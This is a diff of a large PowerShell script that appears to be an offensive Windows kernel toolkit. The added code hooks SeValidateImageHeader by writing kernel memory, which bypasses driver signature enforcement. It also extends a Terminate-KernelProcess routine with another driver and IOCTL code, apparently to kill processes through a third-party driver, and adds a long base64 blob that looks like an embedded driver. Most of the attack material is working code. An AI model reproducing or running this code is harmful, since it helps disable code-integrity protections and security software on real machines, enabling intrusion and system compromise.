-        public uint VirtualAddress;
-        public uint SizeOfRawData;
-        public uint PointerToRawData;
-        public uint PointerToRelocations;
-        public uint PointerToLinenumbers;
-        public ushort NumberOfRelocations;
-        public ushort NumberOfLinenumbers;
-        public IMAGE_SCN Characteristics;
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_IMPORT_DESCRIPTOR
-    {
-        public uint OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
-        public uint TimeDateStamp; // 0 if not bound,
-                                            // -1 if bound, and real date/time stamp
-                                            // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
-                                            // O.W. date/time stamp of DLL bound to (Old BIND)
-        public uint ForwarderChain; // -1 if no forwarders
-        public uint Name;
-        public uint FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)
-    }
-
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_THUNK_DATA32
-    {
-        public Int32 AddressOfData; // PIMAGE_IMPORT_BY_NAME
-    }
-
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_THUNK_DATA64
-    {
-        public Int64 AddressOfData; // PIMAGE_IMPORT_BY_NAME
-    }
-        
-    [StructLayout(LayoutKind.Sequential, Pack=1)]
-    public struct _IMAGE_IMPORT_BY_NAME
-    {
-        public ushort Hint;
-        public char Name;
-    }
-}
-"@
-
-$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
-$compileParams.ReferencedAssemblies.AddRange(@('System.dll', 'mscorlib.dll'))
-$compileParams.GenerateInMemory = $True
-Add-Type -TypeDefinition $code -CompilerParameters $compileParams -PassThru -WarningAction SilentlyContinue | Out-Null
-}
 function Get-gCiOptionsAddress {
     param (
         [Int64]$g_CiOptions = 0
@@ -4728,6 +5223,115 @@ function Get-gCiOptionsAddress {
         Write-Error "Error parsing Virtual Address context."
     }
     return 0
+}
+function Invoke-SeValidateImageHeaderHook {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, ParameterSetName = 'InstallSet')]
+        [Switch]$Install,
+
+        [Parameter(Mandatory = $true, ParameterSetName = 'RemoveSet')]
+        [Switch]$Remove,
+
+        [Parameter(Mandatory = $false)]
+        [Int64]$KernelBaseAddress = 0
+    )
+
+    process {
+
+        $osBuild      = (Get-CimInstance -ClassName Win32_OperatingSystem).BuildNumber
+        $deviceGuard  = Get-CimInstance -Namespace "root\Microsoft\Windows\DeviceGuard" -ClassName "Win32_DeviceGuard"
+        $isVbsRunning = $deviceGuard.VirtualizationBasedSecurityStatus -eq 2
+
+        if ($osBuild -ge 22000 -and $isVbsRunning) {
+            Write-Host "Unsupported: Active VBS on Windows 11 & Above, BSOD RISK upon subsequent driver loading." -ForegroundColor Yellow
+            return
+        }
+
+        # Determine base address once if not provided
+        if ($KernelBaseAddress -eq 0) {
+            $ptr = Get-KernelBaseAddress
+            $kernelBase = [Int64]$ptr.ToInt64()
+        } else {
+            $kernelBase = $KernelBaseAddress
+        }
+
+        $ptr = Get-KernelBaseAddress
+        $kernelBase = [Int64]$ptr.ToInt64()
+
+        $RVA = 0L
+        $ProcedureAddress = [IntPtr]::Zero
+        $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
+        $AnsiPtr = Init-NativeString -Value 'SeGetCachedSigningLevel' -Encoding Ansi
+        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
+        Free-NativeString -StringPtr $AnsiPtr
+
+        if ($ProcedureAddress -ne 0L) {
+            $FuncBytes = New-Object Byte[] 16
+            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)
+        
+            for ($i = 0; $i -lt 12; $i++) {
+                if ($FuncBytes[$i] -eq 0x4C -and $FuncBytes[$i+1] -eq 0x8B -and $FuncBytes[$i+2] -eq 0x1D) {
+                    $DispOffset = $i + 3
+                    $Displacement = [BitConverter]::ToInt32($FuncBytes, $DispOffset)
+                    $NextInstructionOffset = $i + 7
+                    $ModuleBase = $hModule
+                    $FuncRVA = $ProcedureAddress.ToInt64() - $ModuleBase.ToInt64()
+                    $RVA = $FuncRVA + $NextInstructionOffset + $Displacement           
+                    break
+        }}}
+
+        if ($RVA -eq 0) { 
+            throw "Failed to resolve SeGetCachedSigningLevel offset Or Pattern didn't Match."
+        }
+        $SeValidateImageHeader = $kernelBase + $RVA + 0x10
+
+        $RVA = 0L
+        $ProcedureAddress = [IntPtr]::Zero
+        $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
+        $AnsiPtr = Init-NativeString -Value 'ZwFlushInstructionCache' -Encoding Ansi
+        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
+        Free-NativeString -StringPtr $AnsiPtr
+        if ($ProcedureAddress -eq [IntPtr]::Zero) {
+            throw "Failed to resolve ZwFlushInstructionCache address."
+        }
+        $RVA = $ProcedureAddress.ToInt64() - $hModule.ToInt64()
+
+        # --- MODE 1: INSTALL THE HOOK ---
+        if ($PSCmdlet.ParameterSetName -eq 'InstallSet') {
+
+            Write-Verbose "Resolving kernel addresses and installing hook..."
+
+            # Save the original pointer state before modifying
+            if ($global:CallbackAddress -eq $null) {
+                $global:CallbackAddress = Read-VirtualAddress -VA $SeValidateImageHeader -AsLong
+            }
+
+            # Write the new redirection address
+            Write-VirtualAddress -VA $SeValidateImageHeader -Long ($kernelBase + $RVA) | Out-Null
+            
+            Write-Host "Hook successfully installed." -ForegroundColor Green
+            Write-Host ("Original Address = {0:X}" -f $global:CallbackAddress)
+            Write-Host ("Hooked Address   = {0:X}" -f ($kernelBase + $RVA))
+        }
+
+        # --- MODE 2: REMOVE THE HOOK ---
+        elseif ($PSCmdlet.ParameterSetName -eq 'RemoveSet') {
+
+            Write-Verbose "Restoring original pointer state..."
+
+            if ($null -eq $global:CallbackAddress) {
+                Write-Error "Cannot remove hook: No active callback state is saved in memory."
+                return
+            }
+
+            # Restore the pointer and clear out the global tracker
+            Write-VirtualAddress -VA $SeValidateImageHeader -Long $global:CallbackAddress | Out-Null
+            $global:CallbackAddress = $null
+            
+            Write-Host "Hook successfully removed and memory restored." -ForegroundColor Yellow
+        }
+    }
 }
 #endregion
 #region Helper
@@ -5262,180 +5866,6 @@ function Get-FunctionAddress {
         $Handle.Free()
     }
 }
-function Get-Imports {
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $true)]
-        [string]$DllName
-    )
-
-    function Convert-RVAToFileOffset([int64]$Rva, [PSObject[]]$SectionHeaders) {
-        foreach ($Section in $SectionHeaders) {
-            $SecVA   = [int64][uint32]$Section.VirtualAddress
-            $SecSize = [int64][uint32]$Section.VirtualSize
-            $RawPtr  = [int64][uint32]$Section.PointerToRawData
-
-            if ($Rva -ge $SecVA -and $Rva -lt ($SecVA + $SecSize)) {
-                return $Rva - $SecVA + $RawPtr
-            }
-        }
-        return $Rva
-    }
-
-    $DllPath = $DllName
-    if (-not (Test-Path $DllPath)) {
-        $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"
-    }
-
-    if (-not (Test-Path $DllPath)) {
-        Write-Error "DLL file not found at: $DllPath"
-        return $null
-    }
-
-    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
-    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
-    $PEBaseAddr = $Handle.AddrOfPinnedObject()
-
-    $ImportList = [System.Collections.Generic.List[PSCustomObject]]::new()
-
-    try {
-        # 1. Parse DOS Header
-        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
-        $NtHeaderLong = $PEBaseAddr.ToInt64() + $DosHeader.e_lfanew
-        $PointerNtHeader = [IntPtr]$NtHeaderLong
-
-        # 2. Detect Architecture & Select Struct
-        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
-        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
-        
-        $Is64Bit = $false
-        if ($Architecture -eq 'AMD64' -or $Architecture -eq '267' -or $Architecture -eq '0x8664') {
-            $NtHeaderType = [PE+_IMAGE_NT_HEADERS64]
-            $Is64Bit = $true
-        } elseif ($Architecture -eq 'I386' -or $Architecture -eq '332' -or $Architecture -eq '0x014c') {
-            $NtHeaderType = [PE+_IMAGE_NT_HEADERS32]
-        } else {
-            Write-Error "Unsupported architecture: $Architecture"
-            return $null
-        }
-
-        # Parse correct NT header
-        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $NtHeaderType)
-        $NumSections = $NtHeader.FileHeader.NumberOfSections
-
-        # Explicit Section Header Calculation
-        $SizeOfOptionalHeader = $NtHeader.FileHeader.SizeOfOptionalHeader
-        $PointerSectionHeader = [IntPtr]($NtHeaderLong + 4 + 20 + $SizeOfOptionalHeader)
-
-        # 3. Parse Section Headers
-        $SectionHeaders = New-Object PSObject[]($NumSections)
-        $SectionHeaderSize = [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER])
-        for ($i = 0; $i -lt $NumSections; $i++) {
-            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
-                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * $SectionHeaderSize)),
-                [Type] [PE+_IMAGE_SECTION_HEADER]
-            )
-        }
-
-        # 4. Check for Import Data Directory (Index 1)
-        $ImportDirRVA = [int64][uint32]$NtHeader.OptionalHeader.DataDirectory[1].VirtualAddress
-        if ($ImportDirRVA -eq 0) {
-            Write-Warning "Module does not contain an Import Directory."
-            return @()
-        }
-
-        $ImportDirOffset = Convert-RVAToFileOffset -Rva $ImportDirRVA -SectionHeaders $SectionHeaders
-        $DescriptorSize = [Marshal]::SizeOf([Type][PE+_IMAGE_IMPORT_DESCRIPTOR])
-        $CurrentImportDescriptorOffset = $ImportDirOffset
-
-        # Loop through each dependency block (Import Descriptor)
-        while ($true) {
-            if ($CurrentImportDescriptorOffset -ge $FileByteArray.Length) { break }
-
-            $DescriptorPtr = [IntPtr]($PEBaseAddr.ToInt64() + $CurrentImportDescriptorOffset)
-            $ImportDescriptor = [Marshal]::PtrToStructure($DescriptorPtr, [Type][PE+_IMAGE_IMPORT_DESCRIPTOR])
-
-            # End of Import Table marker
-            if ($ImportDescriptor.Characteristics -eq 0 -and $ImportDescriptor.Name -eq 0 -and $ImportDescriptor.FirstThunk -eq 0) {
-                break
-            }
-            if ($ImportDescriptor.Name -eq 0) { break }
-
-            # Resolve dependent DLL name
-            $NameRva = [int64][uint32]$ImportDescriptor.Name
-            $ImportedDllNameOffset = Convert-RVAToFileOffset -Rva $NameRva -SectionHeaders $SectionHeaders
-            $ImportedDllName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $ImportedDllNameOffset))
-
-            # FIX: Explicitly check OriginalFirstThunk (Characteristics). If 0, use FirstThunk.
-            # This protects against reading garbage metadata strings outside the IAT.
-            $ThunkRVA = [int64][uint32]$ImportDescriptor.Characteristics
-            if ($ThunkRVA -eq 0) {
-                $ThunkRVA = [int64][uint32]$ImportDescriptor.FirstThunk
-            }
-
-            if ($ThunkRVA -eq 0) {
-                $CurrentImportDescriptorOffset += $DescriptorSize
-                continue
-            }
-
-            $ThunkOffset = Convert-RVAToFileOffset -Rva $ThunkRVA -SectionHeaders $SectionHeaders
-            $ThunkSize = if ($Is64Bit) { 8 } else { 4 }
-            $CurrentThunkOffset = $ThunkOffset
-
-            # Inner loop: Collect functions for this module block
-            while ($true) {
-                if ($CurrentThunkOffset -ge $FileByteArray.Length) { break }
-
-                $ThunkValue = if ($Is64Bit) {
-                    [Marshal]::ReadInt64([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
-                } else {
-                    [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
-                }
-
-                if ($ThunkValue -eq 0) { break }
-
-                # Check if imported by Ordinal vs Named String
-                $OrdinalBitMask = if ($Is64Bit) { [Int64]::MinValue } else { [Int32]::MinValue }
-                if (($ThunkValue -band $OrdinalBitMask) -eq 0) {
-                    
-                    $SafeRva = [int64]($ThunkValue -band 0x7FFFFFFF)
-                    $NameStructOffset = Convert-RVAToFileOffset -Rva $SafeRva -SectionHeaders $SectionHeaders
-                    
-                    if ($NameStructOffset -lt $FileByteArray.Length) {
-                        # +2 skips the structural Hint word inside the IMAGE_IMPORT_BY_NAME record
-                        $ImportedFuncName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $NameStructOffset + 2))
-
-                        if (-not [string]::IsNullOrEmpty($ImportedFuncName)) {
-                            $ImportList.Add([PSCustomObject]@{
-                                ImportedFunction = $ImportedFuncName
-                                SourceModule     = $ImportedDllName
-                                ImportType       = "Name"
-                            })
-                        }
-                    }
-                } else {
-                    $OrdinalValue = $ThunkValue -band 0xFFFF
-                    $ImportList.Add([PSCustomObject]@{
-                        ImportedFunction = "Ordinal_$OrdinalValue"
-                        SourceModule     = $ImportedDllName
-                        ImportType       = "Ordinal"
-                    })
-                }
-
-                $CurrentThunkOffset += $ThunkSize
-            }
-
-            $CurrentImportDescriptorOffset += $DescriptorSize
-        }
-
-        return $ImportList
-
-    } finally {
-        if ($Handle -and $Handle.IsAllocated) {
-            $Handle.Free()
-        }
-    }
-}
 function Get-DriverAddress {
     param (
         [string]$DriverName
@@ -5660,7 +6090,7 @@ function Terminate-KernelProcess {
         [Int32]$ProcID,
 
         [Parameter(Mandatory = $false, Position = 1)]
-        [ValidateSet("All", "HWAuidoOs2Ec", "STProcessMonitorDriver", "wamsdk", "d591004", "ProcessCtr", "GGProtect64", "ksapi", "CcProtect", "EnPortv", "xkpsm")]
+        [ValidateSet("All", "HWAuidoOs2Ec", "STProcessMonitorDriver", "wamsdk", "d591004", "ProcessCtr", "GGProtect64", "ksapi", "CcProtect", "EnPortv", "xkpsm", "MonProcessEX")]
         [String]$Driver = "All"
     )
 
@@ -5675,6 +6105,17 @@ function Terminate-KernelProcess {
             RequiresSys  = $false
             IoPattern    = "Standard"
             BlockName    = "HWAuid"
+        },
+        @{
+            FileName     = "MonProcessEX"
+            Alternative  = "MonProcessEX"
+            Symbolic     = "Device"
+            IoctlCode    = 0x22400C
+            InputSize    = 4
+            OutputSize   = 4
+            RequiresSys  = $false
+            IoPattern    = "Standard"
+            BlockName    = "MonProcessEX"
         },
         @{
             FileName     = "STProcessMonitorDriver"
@@ -17968,6 +18409,357 @@ tAkyTzJjrKXwkhEOsIJPCbQAyOS/wVD4ccOhK/9aJseDSOr9WHNkfv12UNJCzxrGm+gEERzmCSmop6Je
 +UD3fsiiYleKpkP0GWw87muinbzAEz/imAV+yvNuXtRX+uqGI8zo7Ihs8Hn1yxuwu/UrzBZh1EUMZs4LyJtjAtnqyERdk7LfLKluhDbZhvfUxxKM9zCoOCKU
 GpI8JS+EblyhpPbMqPGND1ftIe01cnTKdSBzb3lrLLzl4MByt0tEeBB5LZUCKVkxtzVnKBYlI5FeVrsM6N98fdJokw8QJQYsb/VYj8ig+hbCCRZBVy4NBXyQ
 cpR6GRMYTi9pGx1mZmBfEiMcSVROJu6lbKK4fmsidUawH2w9cFa1Y51rsZkh0W/I+2JD1Xjep/3m/gc=
+#>
+## END ##
+## MonProcessEX ##
+<#
+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
